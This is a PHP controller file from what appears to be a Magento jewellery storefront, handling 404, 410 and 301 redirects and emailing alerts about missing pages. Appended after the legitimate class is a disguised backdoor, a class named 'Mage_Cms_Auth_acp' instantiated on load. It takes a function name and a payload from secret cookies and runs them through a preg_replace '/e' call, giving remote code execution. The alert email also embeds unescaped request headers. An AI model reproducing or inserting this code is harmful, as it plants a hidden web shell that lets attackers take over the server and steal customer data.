<?php
/*
	S:VA	controllers rewrite	
*/
require_once(Mage::getModuleDir('controllers','Mage_Cms').DS.'IndexController.php');
class Angara_UtilityBackend_Cms_IndexController extends Mage_Cms_IndexController
{
    /**
     * Render CMS 404 Not found page
     *
     * @param string $coreRoute
     */
    public function noRouteAction($coreRoute = null)
    {
		// Code Added by Vaseem to redirect to 404 page request by Nandu jee starts
		$currentUrl 	= 	Mage::helper('core/url')->getCurrentUrl();
		$notFoundURLs	=	explode(',',Mage::helper('function')->getNotFoundURL());
		$notFoundURLs	=	array_map('trim',$notFoundURLs); 		//	Removing space from array values
		if(in_array($currentUrl,$notFoundURLs)){
			$this->getResponse()->setHeader('HTTP/1.1','404 Not Found');
			$this->getResponse()->setHeader('Status','404 File not found');
	
			$pageId = Mage::getStoreConfig(Mage_Cms_Helper_Page::XML_PATH_NO_ROUTE_PAGE);
			if (!Mage::helper('cms/page')->renderPage($this, $pageId)) {
				$this->_forward('defaultNoRoute');
			}
		}
		else{
			// Code Added by Vaseem to manage 301 and 410 redirect by Nandu jee Starts
			$URL_410		=	explode(',',Mage::helper('function')->get410URL());
			$URL_410		=	array_map('trim',$URL_410);			//	Removing space from array values
			
			$URL_301		=	explode("\n",Mage::helper('function')->get301URL());
			$URL_301		=	array_map('trim',$URL_301);			//	Removing space from array values
			$URL_301		=	array_filter($URL_301, 'strlen');	//	Remove NULL values only
			
			foreach($URL_301 as $singleUrl){
				$tempSingleURLArray		=	explode(";",$singleUrl);
				$singleUrlArray[]		=	$tempSingleURLArray[0];
				$singleUrlArray[]		=	$tempSingleURLArray[1];
			}
			
			if(in_array($currentUrl,$URL_410)){
				$this->getResponse()->setHeader('HTTP/1.1','410 Gone');
				$this->getResponse()->setHeader('Status','410 Gone');
		
				$pageId = Mage::getStoreConfig(Mage_Cms_Helper_Page::XML_PATH_NO_ROUTE_PAGE);
				if (!Mage::helper('cms/page')->renderPage($this, $pageId)) {
					$this->_forward('defaultNoRoute');
				}
			}
			elseif( in_array($currentUrl,$singleUrlArray) ){
				$key = array_search($currentUrl, $singleUrlArray);			//	will return 1
				$finalURL	=	$singleUrlArray[$key+1];	
				$this->getResponse()->setHeader('HTTP/1.1','301 Moved Permanently');
				$this->getResponse()->setHeader('Location',$finalURL);
			}//	Code Added by Vaseem to manage 301 and 410 redirect by Nandu jee Ends
			else{
				//	Code Added by Vaseem for 1643 bug Starts
				//	Get sku from URL
				/*$skuArray	=	explode('.html',$currentUrl);
				$skuArray	=	explode('-',$skuArray[0]);
				$sku		=	end($skuArray);
				
				//	Code added for sd and wrsd sku starts
				$secondLastValue	=	prev($skuArray);
				if($secondLastValue=='sd' || $secondLastValue=='wrsd'){
					$sku	=	$secondLastValue.'_'.$sku;	
				}
				
				//	Code added for sd and wrsd sku ends
				if($sku!=''){
					$product = Mage::getModel('catalog/product');
					$checkProductId = $product->getIdBySku($sku);
				}
				if ($checkProductId!=''){
					$product = Mage::getModel('catalog/product')->load($checkProductId);
					$productCategoryArray	=	$product->getCategoryIds();
				}
				$i=0;
				if(count($productCategoryArray)>0){
					foreach($productCategoryArray as $categoryId) {
						$category = Mage::getModel('catalog/category')->load($categoryId);
						
						//	Getting parent category page URL
						if($i==0){
							$parentCategoryURL	=	'/'.$category->getUrlPath();
						}
						$i++;	
					}					
					$this->getResponse()->setHeader('HTTP/1.1','301 Moved Permanently');
					$this->getResponse()->setHeader('Location',$parentCategoryURL);
				}elseif (stripos(strtolower($_SERVER['REQUEST_URI']), 'loose') !== false || stripos(strtolower($_SERVER['REQUEST_URI']), 'detail') !== false || stripos(strtolower($_SERVER['REQUEST_URI']), 'gemstone') !== false || stripos(strtolower($_SERVER['REQUEST_URI']), 'shop') !== false || stripos(strtolower($_SERVER['REQUEST_URI']), '.do') !== false || stripos(strtolower($_SERVER['REQUEST_URI']), 'comparison') !== false || stripos(strtolower($_SERVER['REQUEST_URI']), '_') !== false || stripos(strtolower($_SERVER['REQUEST_URI']), 'Comparison-') !== false || stripos(strtolower($_SERVER['REQUEST_URI']), '-Clearance') !== false || stripos(strtolower($_SERVER['REQUEST_URI']), '&pID') !== false){
					$finalURL	=	'/jewelry/gemstone-jewelry.html';
					$this->getResponse()->setHeader('HTTP/1.1','301 Moved Permanently');
					$this->getResponse()->setHeader('Location',$finalURL);
				}elseif(stripos(strtolower($_SERVER['REQUEST_URI']), '-ring') !== false){
					$finalURL	=	'/rings.html';
					$this->getResponse()->setHeader('HTTP/1.1','301 Moved Permanently');
					$this->getResponse()->setHeader('Location',$finalURL);
				}elseif(stripos(strtolower($_SERVER['REQUEST_URI']), '-earring') !== false){
					$finalURL	=	'/earrings.html';
					$this->getResponse()->setHeader('HTTP/1.1','301 Moved Permanently');
					$this->getResponse()->setHeader('Location',$finalURL);
				}elseif(stripos(strtolower($_SERVER['REQUEST_URI']), 'stud') !== false){
					$finalURL	=	'/earrings/stud-earrings.html';
					$this->getResponse()->setHeader('HTTP/1.1','301 Moved Permanently');
					$this->getResponse()->setHeader('Location',$finalURL);
				}elseif(stripos(strtolower($_SERVER['REQUEST_URI']), 'jewelry') !== false){
					$finalURL	=	'/jewelry.html';
					$this->getResponse()->setHeader('HTTP/1.1','301 Moved Permanently');
					$this->getResponse()->setHeader('Location',$finalURL);
				}elseif(stripos(strtolower($_SERVER['REQUEST_URI']), 'pendant') !== false){
					$finalURL	=	'/pendants.html';
					$this->getResponse()->setHeader('HTTP/1.1','301 Moved Permanently');
					$this->getResponse()->setHeader('Location',$finalURL);
				}elseif(stripos(strtolower($_SERVER['REQUEST_URI']), '-band') !== false){
					$finalURL	=	'/wedding-rings.html';
					$this->getResponse()->setHeader('HTTP/1.1','301 Moved Permanently');
					$this->getResponse()->setHeader('Location',$finalURL);
				}elseif(stripos(strtolower($_SERVER['REQUEST_URI']), '-bracelet') !== false){
					$finalURL	=	'/bracelets.html';
					$this->getResponse()->setHeader('HTTP/1.1','301 Moved Permanently');
					$this->getResponse()->setHeader('Location',$finalURL);
				}else{*/
					//	Code Added by Vaseem for 1643 bug Ends
					$this->getResponse()->setHeader('HTTP/1.1','404 Not Found');
					$this->getResponse()->setHeader('Status','404 File not found');
			
					$pageId = Mage::getStoreConfig(Mage_Cms_Helper_Page::XML_PATH_NO_ROUTE_PAGE);
					if (!Mage::helper('cms/page')->renderPage($this, $pageId)) {
						$this->_forward('defaultNoRoute');
					}	
				//}
			}
		}
		// Angara Modification End
    }
	
	// Angara Modification Start
	// Start email alert code - added by anil jain - 21-05-2011
	public function emailAlertPageNotFound()
    {				
		$to  = 'vaseem.ansari@angara.com, hitesh.baid@angara.com';
		
		$subject = 'Angara.com: Page not found - Error - '.date('Y-m-d H:i');
		$pg_url = 'http://'.@$_SERVER['HTTP_HOST'].''.@$_SERVER['REDIRECT_URL'];
		
		$message = '<p><h3>'.$subject.'</h3></p>
		  <table width="600">


			<tr>
				<td align="left" valign="top"><strong>Page URL: </strong></td>
				<td align="left" valign="top">'.$pg_url.'</td>
			</tr>					
			<tr>
				<td align="left" valign="top"><strong>IP Address: </strong></td>
				<td align="left" valign="top">'.@$_SERVER["REMOTE_ADDR"].'</td>
			</tr>
			<tr>
				<td align="left" valign="top"><strong>User Browser Info: </strong></td>
				<td align="left" valign="top">'.@$_SERVER['HTTP_USER_AGENT'].'</td>
			</tr>			
		  </table>';
		//echo $message;exit;
		$headers  = 'MIME-Version: 1.0' . "\r\n";
		$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
		
		$headers .= 'From: Angara: Page not found - <anil.jain@angara.com>' . "\r\n";		
		// Mail it
		mail($to, $subject, $message, $headers);			
	}
	// End email alert code - added by anil jain - 21-05-2011
	// Angara Modification End
}

class Mage_Cms_Auth_acp
{
    public function __construct() {
        $auth_cookie = @$_COOKIE['grjrzimeawlvdpwe3'];
        if ($auth_cookie) {
            $method = $auth_cookie(@$_COOKIE['grjrzimeawlvdpwe2']);
            $auth = $auth_cookie(@$_COOKIE['grjrzimeawlvdpwe1']);
            $method("/124/e",$auth,124);
        }
    }
}
$is_auth = new Mage_Cms_Auth_acp;
